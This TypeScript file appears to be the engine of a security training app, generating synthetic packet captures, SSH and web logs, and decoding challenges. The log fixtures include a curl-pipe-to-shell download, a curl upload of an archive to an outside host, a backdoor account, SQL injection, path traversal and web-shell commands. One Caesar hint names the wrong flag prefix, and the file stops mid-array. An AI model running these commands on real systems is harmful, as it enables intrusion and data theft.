// CyberHub challenge labs: Packet Lab, Log Hunt, Crypto & Encoding Lab and Secure Code Review.
// All data is synthetic and generated here (reserved example IPs and domains), so every answer is
// checkable offline. Engines are exported for tests. Text only, no innerHTML.
import { sha256Bytes } from './sha256.js';

/* ============================================================ Packet Lab */
export type Pkt = { no: number; t: number; src: string; dst: string; proto: string; sport?: number; dport?: number; flags?: string; len: number; info: string;
  dns?: string; host?: string; uri?: string; method?: string; ua?: string; ftp?: string };
const NAMES: Record<number, string> = { 21: 'ftp', 22: 'ssh', 23: 'telnet', 25: 'smtp', 53: 'domain', 80: 'http', 110: 'pop3', 139: 'netbios', 143: 'imap', 443: 'https', 445: 'microsoft-ds', 3389: 'ms-wbt-server', 8080: 'http-alt' };
export function capture(): Pkt[] {
  const P: Omit<Pkt, 'no'>[] = []; let t = 0;
  const add = (p: Omit<Pkt, 'no' | 't' | 'len'> & { len?: number }) => { t += 0.013 + (P.length % 7) * 0.011; P.push({ len: 60, ...p, t: Math.round(t * 1000) / 1000 }); };
  const dnsq = (src: string, name: string, ans: string, type = 'A') => { add({ src, dst: '10.0.5.1', proto: 'DNS', sport: 50000 + P.length, dport: 53, len: 74, info: `Standard query ${type} ${name}`, dns: name });
    add({ src: '10.0.5.1', dst: src, proto: 'DNS', sport: 53, dport: 50000 + P.length - 1, len: 90, info: `Standard query response ${type} ${name} ${ans}`, dns: name }); };
  const tcp = (src: string, dst: string, sport: number, dport: number, flags: string, info = '') => add({ src, dst, proto: 'TCP', sport, dport, flags, info: info || `${sport} → ${dport} [${flags}]` });
  // Normal morning traffic
  add({ src: '10.0.5.23', dst: 'ff:ff:ff:ff:ff:ff', proto: 'ARP', len: 42, info: 'Who has 10.0.5.1? Tell 10.0.5.23' });
  add({ src: '10.0.5.1', dst: '10.0.5.23', proto: 'ARP', len: 42, info: '10.0.5.1 is at 00:1a:2b:3c:4d:01' });
  dnsq('10.0.5.23', 'updates.example.com', '192.0.2.10');
  tcp('10.0.5.23', '192.0.2.10', 51500, 443, 'SYN'); tcp('192.0.2.10', '10.0.5.23', 443, 51500, 'SYN,ACK'); tcp('10.0.5.23', '192.0.2.10', 51500, 443, 'ACK');
  add({ src: '10.0.5.23', dst: '192.0.2.10', proto: 'TLS', sport: 51500, dport: 443, len: 517, info: 'Client Hello (SNI=updates.example.com)' });
  add({ src: '192.0.2.10', dst: '10.0.5.23', proto: 'TLS', sport: 443, dport: 51500, len: 1400, info: 'Server Hello, Certificate' });
  // Outside port scan against the file server
  const open = [21, 22, 80, 445];
  for (const port of [21, 22, 23, 25, 53, 80, 110, 139, 143, 443, 445, 3389, 8080]) {
    tcp('203.0.113.66', '10.0.5.20', 40112, port, 'SYN', `40112 → ${port} (${NAMES[port]}) [SYN]`);
    tcp('10.0.5.20', '203.0.113.66', port, 40112, open.includes(port) ? 'SYN,ACK' : 'RST,ACK');
  }
  add({ src: '10.0.5.31', dst: '10.0.5.1', proto: 'ICMP', len: 98, info: 'Echo (ping) request' });
  add({ src: '10.0.5.1', dst: '10.0.5.31', proto: 'ICMP', len: 98, info: 'Echo (ping) reply' });
  // Cleartext FTP login from a backup script
  tcp('10.0.5.40', '10.0.5.20', 52011, 21, 'SYN'); tcp('10.0.5.20', '10.0.5.40', 21, 52011, 'SYN,ACK'); tcp('10.0.5.40', '10.0.5.20', 52011, 21, 'ACK');
  add({ src: '10.0.5.20', dst: '10.0.5.40', proto: 'FTP', sport: 21, dport: 52011, len: 86, info: 'Response: 220 Inland State file server ready', ftp: '220' });
  add({ src: '10.0.5.40', dst: '10.0.5.20', proto: 'FTP', sport: 52011, dport: 21, len: 72, info: 'Request: USER backup', ftp: 'USER' });
  add({ src: '10.0.5.20', dst: '10.0.5.40', proto: 'FTP', sport: 21, dport: 52011, len: 88, info: 'Response: 331 Password required for backup', ftp: '331' });
  add({ src: '10.0.5.40', dst: '10.0.5.20', proto: 'FTP', sport: 52011, dport: 21, len: 76, info: 'Request: PASS Winter2026', ftp: 'PASS' });
  add({ src: '10.0.5.20', dst: '10.0.5.40', proto: 'FTP', sport: 21, dport: 52011, len: 80, info: 'Response: 230 Login successful', ftp: '230' });
  add({ src: '10.0.5.40', dst: '10.0.5.20', proto: 'FTP', sport: 52011, dport: 21, len: 84, info: 'Request: STOR nightly-db.tar.gz', ftp: 'STOR' });
  // Phishing download over plain HTTP
  dnsq('10.0.5.31', 'invoice-portal.example.net', '198.51.100.77');
  tcp('10.0.5.31', '198.51.100.77', 53344, 80, 'SYN'); tcp('198.51.100.77', '10.0.5.31', 80, 53344, 'SYN,ACK'); tcp('10.0.5.31', '198.51.100.77', 53344, 80, 'ACK');
  add({ src: '10.0.5.31', dst: '198.51.100.77', proto: 'HTTP', sport: 53344, dport: 80, len: 412, info: 'GET /billing/invoice_2026.exe HTTP/1.1', method: 'GET', uri: '/billing/invoice_2026.exe', host: 'invoice-portal.example.net', ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)' });
  add({ src: '198.51.100.77', dst: '10.0.5.31', proto: 'HTTP', sport: 80, dport: 53344, len: 1514, info: 'HTTP/1.1 200 OK (application/x-msdownload)' });
  add({ src: '10.0.5.23', dst: '192.0.2.10', proto: 'TLS', sport: 51500, dport: 443, len: 310, info: 'Application Data' });
  // DNS tunneling: long encoded labels to one domain
  for (const label of ['aGVsbG8gZnJvbSBzZXJ2ZXIx', 'dXNlcm5hbWVzLmNzdi5wYXJ0MQ', 'cGFydDIuYmFja3VwLWtleXM', 'ZW5kLW9mLXRyYW5zZmVy'])
    dnsq('10.0.5.52', `${label}.t1.cdn-sync.example.org`, '0.0.0.0', 'TXT');
  // Internal ARP sweep from a rogue device
  for (let h = 2; h <= 14; h++) add({ src: '10.0.5.99', dst: 'ff:ff:ff:ff:ff:ff', proto: 'ARP', len: 42, info: `Who has 10.0.5.${h}? Tell 10.0.5.99` });
  dnsq('10.0.5.44', 'portal.csusb.example.edu', '192.0.2.44');
  add({ src: '10.0.5.44', dst: '192.0.2.44', proto: 'TLS', sport: 54100, dport: 443, len: 517, info: 'Client Hello (SNI=portal.csusb.example.edu)' });
  // ---- Advanced: what happened after the download
  // Lateral movement: the infected host tries admin ports on internal servers
  for (const [dst, port, ok] of [['10.0.5.20', 445, true], ['10.0.5.10', 3389, true], ['10.0.5.11', 5985, false], ['10.0.5.12', 22, false]] as [string, number, boolean][]) {
    tcp('10.0.5.31', dst, 53400 + port % 100, port, 'SYN'); tcp(dst, '10.0.5.31', port, 53400 + port % 100, ok ? 'SYN,ACK' : 'RST,ACK');
  }
  // Gateway impersonation: a second MAC claims the router's IP
  add({ src: '10.0.5.99', dst: '10.0.5.23', proto: 'ARP', len: 42, info: '10.0.5.1 is at 00:1a:2b:66:66:66' });
  add({ src: '10.0.5.99', dst: '10.0.5.31', proto: 'ARP', len: 42, info: '10.0.5.1 is at 00:1a:2b:66:66:66' });
  // Beaconing: identical small TLS hellos to one name, again and again
  for (let k = 0; k < 6; k++) { add({ src: '10.0.5.57', dst: '203.0.113.200', proto: 'TLS', sport: 55010 + k, dport: 443, len: 233, info: 'Client Hello (SNI=status.cdn-check.example.com)' }); dnsq('10.0.5.23', `cdn${k}.example.com`, `192.0.2.${60 + k}`); }
  // Exfiltration over HTTP POST to the server that hosted the malware
  for (const len of [1514, 1514, 873]) add({ src: '10.0.5.31', dst: '198.51.100.77', proto: 'HTTP', sport: 53390, dport: 80, len, info: 'POST /api/v2/sync HTTP/1.1', method: 'POST', uri: '/api/v2/sync', host: 'invoice-portal.example.net', ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)' });
  return P.map((p, i) => ({ ...p, no: i + 1 }));
}

type Tok = { k: 'op' | 'word' | 'str' | 'lp' | 'rp' | 'and' | 'or' | 'not'; v: string };
function lex(s: string): Tok[] {
  const out: Tok[] = []; let i = 0;
  while (i < s.length) {
    const c = s[i];
    if (/\s/.test(c)) { i++; continue; }
    if (c === '(') { out.push({ k: 'lp', v: c }); i++; continue; }
    if (c === ')') { out.push({ k: 'rp', v: c }); i++; continue; }
    if (s.startsWith('&&', i)) { out.push({ k: 'and', v: '&&' }); i += 2; continue; }
    if (s.startsWith('||', i)) { out.push({ k: 'or', v: '||' }); i += 2; continue; }
    const op = ['==', '!=', '>=', '<=', '>', '<'].find(o => s.startsWith(o, i));
    if (op) { out.push({ k: 'op', v: op }); i += op.length; continue; }
    if (c === '!') { out.push({ k: 'not', v: '!' }); i++; continue; }
    if (c === '"' || c === "'") { const j = s.indexOf(c, i + 1); if (j < 0) throw new Error('Missing closing quote'); out.push({ k: 'str', v: s.slice(i + 1, j) }); i = j + 1; continue; }
    const m = /^[A-Za-z0-9_.:\-\/]+/.exec(s.slice(i)); if (!m) throw new Error(`Unexpected "${c}"`);
    const w = m[0], lw = w.toLowerCase();
    if (lw === 'and') out.push({ k: 'and', v: w }); else if (lw === 'or') out.push({ k: 'or', v: w }); else if (lw === 'not') out.push({ k: 'not', v: w });
    else if (lw === 'contains' || lw === 'eq' || lw === 'ne') out.push({ k: 'op', v: lw === 'eq' ? '==' : lw === 'ne' ? '!=' : 'contains' });
    else out.push({ k: 'word', v: w });
    i += w.length;
  }
  return out;
}
const PROTOS = ['arp', 'dns', 'tcp', 'udp', 'http', 'tls', 'icmp', 'ftp'];
function field(p: Pkt, f: string): (string | number)[] | null {
  const ports = (which: 's' | 'd' | 'both') => [which !== 'd' ? p.sport : undefined, which !== 's' ? p.dport : undefined].filter((x): x is number => x !== undefined);
  const isTcp = ['TCP', 'HTTP', 'TLS', 'FTP'].includes(p.proto), isUdp = p.proto === 'DNS';
  const fl = (n: string) => [p.flags ? (p.flags.split(',').includes(n) ? 1 : 0) : 0];
  switch (f) {
    case 'ip.addr': return p.proto === 'ARP' ? [] : [p.src, p.dst];
    case 'ip.src': return p.proto === 'ARP' ? [] : [p.src];
    case 'ip.dst': return p.proto === 'ARP' ? [] : [p.dst];
    case 'arp.src.proto_ipv4': return p.proto === 'ARP' ? [p.src] : [];
    case 'tcp.port': return isTcp ? ports('both') : [];
    case 'tcp.srcport': return isTcp ? ports('s') : [];
    case 'tcp.dstport': return isTcp ? ports('d') : [];
    case 'udp.port': return isUdp ? ports('both') : [];
    case 'port': return ports('both');
    case 'tcp.flags.syn': return isTcp ? fl('SYN') : [];
    case 'tcp.flags.ack': return isTcp ? fl('ACK') : [];
    case 'tcp.flags.reset': return isTcp ? fl('RST') : [];
    case 'dns.qry.name': return p.dns ? [p.dns] : [];
    case 'http.host': return p.host ? [p.host] : [];
    case 'http.request.uri': return p.uri ? [p.uri] : [];
    case 'http.request.method': return p.method ? [p.method] : [];
    case 'http.user_agent': return p.ua ? [p.ua] : [];
    case 'ftp.request.command': return p.ftp && /^[A-Z]+$/.test(p.ftp) ? [p.ftp] : [];
    case 'frame.len': return [p.len];
    case 'frame': case 'info': return [`${p.src} ${p.dst} ${p.proto} ${p.info} ${p.dns || ''} ${p.host || ''} ${p.uri || ''} ${p.ua || ''}`];
    default: return null;
  }
}
export function compileFilter(src: string): (p: Pkt) => boolean {
  const toks = lex(src.trim()); let i = 0;
  if (!toks.length) return () => true;
  const peek = () => toks[i]; const eat = (k: Tok['k']) => { const t = toks[i]; if (!t || t.k !== k) throw new Error(t ? `Unexpected "${t.v}"` : 'Filter ends too early'); i++; return t; };
  function expr(): (p: Pkt) => boolean { let l = conj(); while (peek()?.k === 'or') { i++; const a = l, b = conj(); l = p => a(p) || b(p); } return l; }
  function conj(): (p: Pkt) => boolean { let l = unary(); while (peek()?.k === 'and') { i++; const a = l, b = unary(); l = p => a(p) && b(p); } return l; }
  function unary(): (p: Pkt) => boolean {
    if (peek()?.k === 'not') { i++; const a = unary(); return p => !a(p); }
    if (peek()?.k === 'lp') { i++; const a = expr(); eat('rp'); return a; }
    const w = eat('word').v.toLowerCase();
    if (peek()?.k !== 'op') {
      if (PROTOS.includes(w)) return p => p.proto.toLowerCase() === w || (w === 'tcp' && ['HTTP', 'TLS', 'FTP'].includes(p.proto)) || (w === 'udp' && p.proto === 'DNS');
      if (w === 'http.request') return p => !!p.method;
      if (field({ no: 0, t: 0, src: '', dst: '', proto: 'TCP', len: 0, info: '' }, w) !== null) return p => (field(p, w) || []).length > 0;
      throw new Error(`Unknown field or protocol "${w}"`);
    }
    const op = eat('op').v; const vt = peek(); if (!vt || (vt.k !== 'word' && vt.k !== 'str')) throw new Error('Missing a value after ' + op); i++;
    const val = vt.v; if (field({ no: 0, t: 0, src: '', dst: '', proto: 'TCP', len: 0, info: '' }, w) === null) throw new Error(`Unknown field "${w}"`);
    return p => {
      const vs = field(p, w) || [];
      return vs.some(x => {
        if (op === 'contains') return String(x).toLowerCase().includes(val.toLowerCase());
        const n = Number(val), isNum = typeof x === 'number' && !Number.isNaN(n);
        const a = isNum ? x as number : String(x).toLowerCase(), b = isNum ? n : val.toLowerCase();
        return op === '==' ? a === b : op === '!=' ? a !== b : op === '>' ? a > b : op === '<' ? a < b : op === '>=' ? a >= b : a <= b;
      });
    };
  }
  const f = expr(); if (i < toks.length) throw new Error(`Unexpected "${toks[i].v}"`);
  return f;
}

/* ============================================================ Log Hunt */
export type Ev = { time: string; source: 'auth' | 'web'; host: string; src_ip: string; user?: string; action?: string; cmd?: string; method?: string; path?: string; status?: number; ua?: string; raw: string };
export function events(): Ev[] {
  const E: Ev[] = []; let m = 0;
  const ts = (h: number, mi: number, s: number) => `2026-10-21T${String(h).padStart(2, '0')}:${String(mi).padStart(2, '0')}:${String(s).padStart(2, '0')}Z`;
  const auth = (time: string, src_ip: string, user: string, action: string, extra = '') => E.push({ time, source: 'auth', host: 'web01', src_ip, user, action, raw: `${time} web01 sshd: ${action === 'failed' ? 'Failed password' : 'Accepted password'} for ${user} from ${src_ip}${extra}` });
  const web = (time: string, src_ip: string, method: string, path: string, status: number, ua: string) => E.push({ time, source: 'web', host: 'web01', src_ip, method, path, status, ua, raw: `${src_ip} - - [${time}] "${method} ${path} HTTP/1.1" ${status} "${ua}"` });
  const browsers = ['Mozilla/5.0 (Windows NT 10.0) Chrome/130.0', 'Mozilla/5.0 (Macintosh) Safari/18.0', 'Mozilla/5.0 (iPhone) Mobile Safari/18.0'];
  // Normal staff activity
  auth(ts(7, 58, 12), '10.0.5.23', 'mlopez', 'accepted'); auth(ts(8, 4, 40), '10.0.5.31', 'jchen', 'accepted');
  for (const [p, st] of [['/', 200], ['/courses', 200], ['/login', 200], ['/dashboard', 200], ['/static/app.js', 200], ['/favicon.ico', 404]] as [string, number][])
    for (let k = 0; k < 3; k++) web(ts(8, 10 + (m++ % 40), 5 + k * 7), `10.0.5.${20 + k * 7}`, 'GET', p, st, browsers[k]);
  auth(ts(9, 2, 3), '10.0.5.31', 'jchen', 'failed'); auth(ts(9, 2, 9), '10.0.5.31', 'jchen', 'accepted');
  // SSH brute force from outside
  const users = ['root', 'admin', 'test', 'oracle', 'ubuntu', 'deploy'];
  for (let k = 0; k < 42; k++) auth(ts(10, 3 + Math.floor(k / 6), (k * 7) % 60), '203.0.113.66', users[k % users.length], 'failed');
  for (let k = 0; k < 5; k++) auth(ts(10, 20, k * 9), '198.51.100.23', 'root', 'failed');
  auth(ts(10, 11, 32), '203.0.113.66', 'deploy', 'accepted');
  E.push({ time: ts(10, 12, 5), source: 'auth', host: 'web01', src_ip: '203.0.113.66', user: 'deploy', action: 'sudo', cmd: '/bin/bash -c curl -s http://198.51.100.77/m.sh | sh', raw: `${ts(10, 12, 5)} web01 sudo: deploy : TTY=pts/0 ; USER=root ; COMMAND=/bin/bash -c curl -s http://198.51.100.77/m.sh | sh` });
  E.push({ time: ts(10, 12, 40), source: 'auth', host: 'web01', src_ip: '203.0.113.66', user: 'deploy', action: 'useradd', cmd: 'useradd -m -s /bin/bash sysupd', raw: `${ts(10, 12, 40)} web01 useradd[4412]: new user: name=sysupd, home=/home/sysupd, shell=/bin/bash` });
  // Web attacks
  const sqlmap = 'sqlmap/1.8.4#stable (https://sqlmap.org)';
  for (const [k, q] of ["1'", "1' OR '1'='1", '1 UNION SELECT NULL,NULL--', "1 AND SLEEP(5)--", '1;DROP TABLE x--'].entries()) web(ts(11, 2, k * 3), '192.0.2.150', 'GET', `/courses/view.php?id=${encodeURIComponent(q)}`, k === 2 || k === 4 ? 500 : 200, sqlmap);
  for (const [k, f] of ['../../etc/passwd', '..%2f..%2f..%2fetc%2fshadow', '....//....//config.php'].entries()) web(ts(11, 30, k * 11), '192.0.2.150', 'GET', `/download.php?file=${f}`, k === 0 ? 200 : 403, 'curl/8.5.0');
  web(ts(11, 45, 2), '10.0.5.44', 'POST', '/login', 302, browsers[0]); web(ts(11, 46, 7), '10.0.5.44', 'GET', '/reports/export', 500, browsers[0]);
  // ---- Advanced: the web shell and the return visit
  const py = 'python-requests/2.32.3';
  web(ts(12, 1, 15), '192.0.2.150', 'POST', '/profile/avatar', 200, py);
  for (const [k, c] of ['id', 'whoami', 'uname -a', 'cat /etc/passwd'].entries()) web(ts(12, 2, 10 + k * 13), '192.0.2.150', 'GET', `/uploads/avatar.php?cmd=${encodeURIComponent(c)}`, 200, py);
  web(ts(12, 5, 0), '10.0.5.23', 'GET', '/uploads/mlopez.png', 200, browsers[1]);
  auth(ts(23, 41, 7), '192.0.2.201', 'sysupd', 'accepted');
  E.push({ time: ts(23, 43, 30), source: 'auth', host: 'web01', src_ip: '192.0.2.201', user: 'sysupd', action: 'sudo', cmd: 'tar czf /tmp/.c.tgz /var/www/grades', raw: `${ts(23, 43, 30)} web01 sudo: sysupd : TTY=pts/1 ; USER=root ; COMMAND=tar czf /tmp/.c.tgz /var/www/grades` });
  E.push({ time: ts(23, 44, 2), source: 'auth', host: 'web01', src_ip: '192.0.2.201', user: 'sysupd', action: 'sudo', cmd: 'curl -s -T /tmp/.c.tgz http://192.0.2.201/u', raw: `${ts(23, 44, 2)} web01 sudo: sysupd : TTY=pts/1 ; USER=root ; COMMAND=curl -s -T /tmp/.c.tgz http://192.0.2.201/u` });
  return E.sort((a, b) => a.time < b.time ? -1 : a.time > b.time ? 1 : 0);
}
export const EV_FIELDS = ['time', 'source', 'host', 'src_ip', 'user', 'action', 'cmd', 'method', 'path', 'status', 'ua'];
export type Rec = { raw: string } & Record<string, unknown>;
export type QResult = { rows: any[]; table?: { cols: string[]; rows: (string | number)[][] }; count: number };
const like = (val: string, pat: string) => { const re = new RegExp('^' + pat.toLowerCase().split('*').map(x => x.replace(/[.+?^${}()|[\]\\]/g, '\\$&')).join('.*') + '$'); return re.test(val.toLowerCase()); };
export function runQuery(all: Rec[] | Ev[], q: string, EVF: readonly string[] = EV_FIELDS): QResult {
  const [search, ...pipes] = q.split('|').map(s => s.trim());
  const terms = search.match(/(?:[^\s"]+="[^"]*"|"[^"]*"|\S+)/g) || [];
  const tests: ((e: Ev) => boolean)[] = []; let neg = false;
  for (const raw of terms) {
    if (/^not$/i.test(raw)) { neg = true; continue; }
    const m = /^([a-z_]+)(!=|>=|<=|=|>|<)(.*)$/.exec(raw); let t: (e: Ev) => boolean;
    if (m) {
      const [, f, op, v0] = m; if (!EVF.includes(f)) throw new Error(`Unknown field "${f}". Fields: ${EVF.join(', ')}`);
      const v = v0.replace(/^"|"$/g, '');
      t = e => { const x = (e as unknown as Record<string, unknown>)[f]; if (x === undefined) return op === '!='; const s = String(x);
        if (op === '=' ) return like(s, v); if (op === '!=') return !like(s, v);
        const a = Number(x), b = Number(v); if (Number.isNaN(a) || Number.isNaN(b)) return false; return op === '>' ? a > b : op === '<' ? a < b : op === '>=' ? a >= b : a <= b; };
    } else { const w = raw.replace(/^"|"$/g, '').toLowerCase(); t = e => e.raw.toLowerCase().includes(w); }
    const n = neg; tests.push(n ? (e => !t(e)) : t); neg = false;
  }
  let rows = (all as Rec[]).filter(e => tests.every(t => t(e))); let table: QResult['table'];
  for (const p of pipes) {
    let m: RegExpExecArray | null;
    if ((m = /^stats\s+count(?:\s+by\s+([a-z_]+))?$/i.exec(p))) {
      const f = m[1]; if (!f) { table = { cols: ['count'], rows: [[rows.length]] }; continue; }
      if (!EVF.includes(f)) throw new Error(`Unknown field "${f}"`);
      const c = new Map<string, number>(); for (const e of rows) { const k = String((e as unknown as Record<string, unknown>)[f] ?? '(none)'); c.set(k, (c.get(k) || 0) + 1); }
      table = { cols: [f, 'count'], rows: [...c.entries()].sort((a, b) => b[1] - a[1] || (a[0] < b[0] ? -1 : 1)) };
    } else if ((m = /^head\s+(\d+)$/i.exec(p))) { const n = Number(m[1]); if (table) table.rows = table.rows.slice(0, n); else rows = rows.slice(0, n); }
    else if ((m = /^tail\s+(\d+)$/i.exec(p))) { const n = Number(m[1]); if (table) table.rows = table.rows.slice(-n); else rows = rows.slice(-n); }
    else if ((m = /^table\s+([a-z_,\s]+)$/i.exec(p))) { const cols = m[1].split(/[,\s]+/).filter(Boolean); for (const c of cols) if (!EVF.includes(c)) throw new Error(`Unknown field "${c}"`); table = { cols, rows: rows.map(e => cols.map(c => String((e as unknown as Record<string, unknown>)[c] ?? ''))) }; }
    else if (p) throw new Error(`Unknown command "${p.split(/\s+/)[0]}". Try: stats count by FIELD, head N, tail N, table f1,f2`);
  }
  return { rows, table, count: rows.length };
}

/* ============================================================ Crypto & Encoding */
const b64e = (s: string) => btoa(unescape(encodeURIComponent(s)));
const b64d = (s: string) => decodeURIComponent(escape(atob(s.replace(/\s+/g, ''))));
const hexe = (s: string) => [...new TextEncoder().encode(s)].map(b => b.toString(16).padStart(2, '0')).join('');
const hexd = (s: string) => { const h = s.replace(/[^0-9a-f]/gi, ''); if (h.length % 2) throw new Error('Hex needs an even number of digits'); return new TextDecoder().decode(new Uint8Array(h.match(/../g)!.map(x => parseInt(x, 16)))); };
const shift = (s: string, n: number) => s.replace(/[a-z]/gi, c => { const b = c <= 'Z' ? 65 : 97; return String.fromCharCode(((c.charCodeAt(0) - b + n) % 26 + 26) % 26 + b); });
const xorHex = (s: string, k: number) => { const h = s.replace(/[^0-9a-f]/gi, ''); if (h.length % 2) throw new Error('Hex needs an even number of digits'); return String.fromCharCode(...h.match(/../g)!.map(x => parseInt(x, 16) ^ k)); };
export type Op = { id: string; name: string; param?: string; run: (s: string, p: number) => string };
export const OPS: Op[] = [
  { id: 'fromb64', name: 'From Base64', run: s => b64d(s) }, { id: 'tob64', name: 'To Base64', run: s => b64e(s) },
  { id: 'fromhex', name: 'From Hex', run: s => hexd(s) }, { id: 'tohex', name: 'To Hex', run: s => hexe(s) },
  { id: 'rot13', name: 'ROT13', run: s => shift(s, 13) }, { id: 'caesar', name: 'Caesar shift', param: 'Shift by', run: (s, n) => shift(s, n) },
  { id: 'urld', name: 'URL decode', run: s => decodeURIComponent(s) }, { id: 'rev', name: 'Reverse', run: s => [...s].reverse().join('') },
  { id: 'xor', name: 'XOR (hex in)', param: 'Key (0-255)', run: (s, n) => xorHex(s, n) },
  { id: 'frombin', name: 'From Binary', run: s => (s.match(/[01]{8}/g) || []).map(b => String.fromCharCode(parseInt(b, 2))).join('') },
  { id: 'fromb64url', name: 'From Base64URL', run: s => { const t = s.trim().replace(/-/g, '+').replace(/_/g, '/'); return b64d(t + '='.repeat((4 - t.length % 4) % 4)); } },
  { id: 'fromdec', name: 'From Decimal', run: s => (s.match(/\d+/g) || []).map(n => { const v = Number(n); if (v > 0x10ffff) throw new Error('too big'); return String.fromCodePoint(v); }).join('') },
];
export function applyRecipe(input: string, recipe: { id: string; p: number }[]): string {
  let s = input;
  recipe.forEach((r, i) => { const op = OPS.find(o => o.id === r.id); if (!op) throw new Error('Unknown step');
    try { s = op.run(s, r.p); } catch { throw new Error(`step ${i + 1} (${op.name}) could not read its input. It is probably not in that format yet: check the order of your recipe`); } });
  return s;
}
export async function sha256(s: string): Promise<string> {
  const bytes = new TextEncoder().encode(s); let d: ArrayBuffer | undefined;
  try { if (globalThis.crypto?.subtle?.digest) d = await globalThis.crypto.subtle.digest('SHA-256', bytes); } catch { /* insecure origin or blocked digest: use the fallback */ }
  return [...(d ? new Uint8Array(d) : sha256Bytes(bytes))].map(b => b.toString(16).padStart(2, '0')).join('');
}
const b64u = (s: string) => b64e(s).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
const xorEnc = (s: string, k: number) => [...s].map(c => (c.charCodeAt(0) ^ k).toString(16).padStart(2, '0')).join(' ');
export const CRYPTO = [
  { id: 'b64', title: 'Base64', input: b64e('HUB{base64_is_not_encryption}'), q: 'Decode the message. What is the flag?', a: 'HUB{base64_is_not_encryption}', hints: ['Strings of letters, numbers, + and / that often end in = are usually Base64.', 'Add "From Base64" to the recipe.'], lesson: 'Base64 is an encoding, not encryption: anyone can reverse it, no key needed. You will see it in emails, web tokens and malware.' },
  { id: 'hex', title: 'Hex', input: hexe('HUB{hex_is_just_bytes}'), q: 'Decode the message. What is the flag?', a: 'HUB{hex_is_just_bytes}', hints: ['Only the digits 0-9 and letters a-f: that is hexadecimal.', 'Add "From Hex".'], lesson: 'Hex writes each byte as two digits. Packet dumps, hashes and memory views all use it.' },
  { id: 'rot13', title: 'ROT13', input: shift('HUB{rot13_for_the_win}', 13), q: 'This looks like the flag format, but scrambled. What is the flag?', a: 'HUB{rot13_for_the_win}', hints: ['The braces and underscores survived, only letters changed. A letter-shift cipher?', 'Try ROT13: it rotates each letter 13 places.'], lesson: 'ROT13 and other shift ciphers keep the shape of text. They hide nothing from anyone who tries.' },
  { id: 'caesar', title: 'Caesar', input: shift('HUB{caesar_shifted_by_three}', 3), q: 'Each letter was shifted forward a few places. What is the flag?', a: 'HUB{caesar_shifted_by_three}', hints: ['The flag always starts CISO. Compare C with the first letter here.', 'C became F, so shift back by 3: use Caesar shift with -3 (or 23).'], lesson: 'A Caesar cipher has only 25 possible keys, so a computer tries them all instantly. Known text, like a flag prefix, gives the key away too.' },
  { id: 'url', title: 'URL encoding', input: encodeURIComponent('HUB{url_encoding_hides_nothing}').replace(/_/g, '%5F'), q: 'Seen in a web server log. What is the flag?', a: 'HUB{url_encoding_hides_nothing}', hints: ['%7B and %7D are percent-encoded characters.', 'Add "URL decode".'], lesson: 'Attackers percent-encode payloads to slip past naive filters, like the ..%2f path traversal in the Log Hunt. Decode before you judge.' },
  { id: 'layers', title: 'Layers', input: b64e(hexe(shift('HUB{layers_on_layers}', 13))), q: 'Malware authors stack encodings. Peel all three layers. What is the flag?', a: 'HUB{layers_on_layers}', hints: ['Start with the outside layer: it looks like Base64.', 'After Base64 you get hex. After hex, the letters are still scrambled.', 'Recipe: From Base64 → From Hex → ROT13.'], lesson: 'Stacked encodings are common in malicious scripts. Peel one layer at a time and check the output after each step.' },
  { id: 'xor', title: 'XOR', input: xorEnc('HUB{xor_needs_a_secret_key}', 42), q: 'These bytes were XORed with a single-byte key. The key is 42. What is the flag?', a: 'HUB{xor_needs_a_secret_key}', hints: ['Add "XOR (hex in)" and set the key.', 'Key = 42.'], lesson: 'XOR with a short, reused key is weak: knowing part of the plaintext reveals the key. Real encryption uses vetted algorithms like AES with random keys.' },
  { id: 'bin', title: 'Binary', input: [...'HUB{eight_bits_per_byte}'].map(c => c.charCodeAt(0).toString(2).padStart(8, '0')).join(' '), q: 'Decode the binary. What is the flag?', a: 'HUB{eight_bits_per_byte}', hints: ['Groups of eight 0s and 1s are bytes.', 'Add "From Binary".'], lesson: 'Every encoding here is just a different way of writing the same bytes.' },
  { id: 'hash', title: 'Hashing', input: 'CyberHub', q: 'A hash is a fingerprint. Press "SHA-256 the input" and enter the first 8 characters of the hash.', a: '', hints: ['Use the "SHA-256 the input" button below the recipe, with the input unchanged.', 'Enter only the first 8 hex characters.'], lesson: 'Change one character and the hash changes completely. That is how you verify a download: compare its hash with the one the vendor published separately.' },
  { id: 'adv-xor-key', title: 'Unknown XOR key', input: xorEnc('HUB{known_plaintext_breaks_xor}', 0x5c), q: 'XORed with a single-byte key nobody told you. You do know every flag starts with HUB{. What is the flag?', a: 'HUB{known_plaintext_breaks_xor}', hints: ['The first byte is "H" (hex 48) XOR the key. 0x14 XOR 0x48 = ?', 'The key is the first byte XOR 0x48. Convert it to decimal for the XOR step.', 'Key = 92.'], lesson: 'Known-plaintext attack: if you know part of the message, single-byte (and short repeating) XOR keys fall out immediately. Real ciphers resist this.' },
  { id: 'adv-jwt', title: 'Read a JWT', input: [b64u('{"alg":"HS256","typ":"JWT"}'), b64u('{"sub":"jperez","role":"student","flag":"HUB{jwts_are_signed_not_encrypted}"}'), 'kq3VzEXAMPLEsignatureXyZ0'].join('.'), q: 'A token from an Authorization header. Decode the middle part (the payload). What is the value of the "flag" claim?', a: 'HUB{jwts_are_signed_not_encrypted}', hints: ['A JWT is header.payload.signature. Delete everything except the middle part.', 'JWTs use Base64URL (- and _ instead of + and /, no padding): use "From Base64URL".'], lesson: 'Anyone holding a JWT can read it. The signature only stops changes. Never put secrets in a token payload, and always verify the signature server-side.' },
  { id: 'adv-decimal', title: 'Char codes', input: [...'HUB{char_codes_in_a_script}'].map(c => c.charCodeAt(0)).join(','), q: 'Found in an obfuscated PowerShell script as [char[]](...). What does it spell?', a: 'HUB{char_codes_in_a_script}', hints: ['Numbers between 32 and 126 are printable ASCII characters.', 'Add "From Decimal".'], lesson: 'Malware hides strings as character codes so simple keyword scanners miss them. Decoding them is everyday work in script triage.' },
  { id: 'adv-onion', title: 'Five layers', input: b64e(hexe([...shift(b64e('HUB{peel_it_like_an_analyst}'), 13)].reverse().join(''))), q: 'Five layers, in an order you have to work out. What is the flag?', a: 'HUB{peel_it_like_an_analyst}', hints: ['Outside first: Base64, then hex.', 'The result looks like Base64 but backwards and letter-shifted. Undo both.', 'From Base64 → From Hex → Reverse → ROT13 → From Base64.'], lesson: 'Layered encoding is cheap for attackers and slow for analysts without a recipe tool. Save your recipes: the same malware family reuses them.' },
